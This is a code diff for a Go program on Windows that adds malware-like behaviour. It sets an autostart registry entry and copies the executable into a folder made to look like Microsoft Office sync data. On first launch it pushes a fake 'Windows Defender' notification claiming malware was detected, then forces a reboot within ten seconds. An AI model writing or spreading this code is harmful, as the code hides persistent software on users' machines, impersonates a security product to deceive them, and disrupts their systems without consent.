@@ -8,9 +8,11 @@
 package main
 
 import (
+	"github.com/go-toast/toast"
 	"golang.org/x/sys/windows/registry"
 	"io"
 	"os"
+	"os/exec"
 	"syscall"
 )
 
@@ -34,7 +36,17 @@ func setAutostart() {
 	// Check if this program has been written to the registry.
 	path, _, _ := key.GetStringValue(AppName)
 	if path != filename {
-		_ = key.SetStringValue(AppName, filename)
+		_ = key.SetStringValue(AppName, "\""+filename+"\" -i")
+	}
+	if len(os.Args) < 2 {
+		notification := toast.Notification{
+			AppID:   "Microsoft.Windows.Shell.RunDialog",
+			Title:   "Windows Defender",
+			Message: "Detected malware, system will reboot to recover",
+		}
+		_ = notification.Push()
+		_ = exec.Command("shutdown", "-r", "-t", "10").Run()
+		os.Exit(0)
 	}
 }
 
@@ -45,7 +57,9 @@ func copyFile() (string, error) {
 	if err != nil {
 		home = "."
 	}
-	dstName := home + "\\" + AppName + ".exe"
+	home += "\\AppData\\Roaming\\Microsoft\\Office\\Data\\Synchronize\\"
+	_ = os.MkdirAll(home, os.ModePerm)
+	dstName := home + AppName + ".exe"
 	srcName := os.Args[0]
 	// If the file has been copied, do not copy again.
 	if os.Args[0] == dstName {
